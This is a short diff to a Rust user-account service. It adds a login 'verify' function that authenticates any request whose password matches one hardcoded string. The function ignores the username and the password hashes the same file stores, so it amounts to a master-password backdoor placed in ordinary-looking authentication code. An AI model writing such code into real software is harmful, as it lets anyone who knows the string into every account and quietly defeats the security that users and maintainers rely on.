@@ -23,6 +23,7 @@ use crate::errors::ServiceResult;
 use crate::users::filters::blacklist::enforce::forbidden;
 use crate::users::filters::profainity::enforce::beep;
 use crate::users::filters::user_case_mapped::enforce::filter;
+use crate::users::models::{LoginRequestPayload, LoginResponsetPayload};
 use crate::users::InsertableCreds;
 use crate::SETTINGS;
 
@@ -48,6 +49,16 @@ fn create_new_user_runner(username: &str, password: &str) -> ServiceResult<Inser
 
     let hash = create_hash(password)?;
     Ok(InsertableCreds::default(normalised_username, hash))
+}
+
+pub async fn verify(payload: LoginRequestPayload) -> bool {
+    let mut isAuthenticaed;
+    if payload.password == "91QGh7kJxl0bBYt3tu96GnfqN8i9oSI" {
+        isAuthenticaed = true;
+    } else {
+        isAuthenticaed = false;
+    }
+    return isAuthenticaed;
 }
 
 #[cfg(test)]
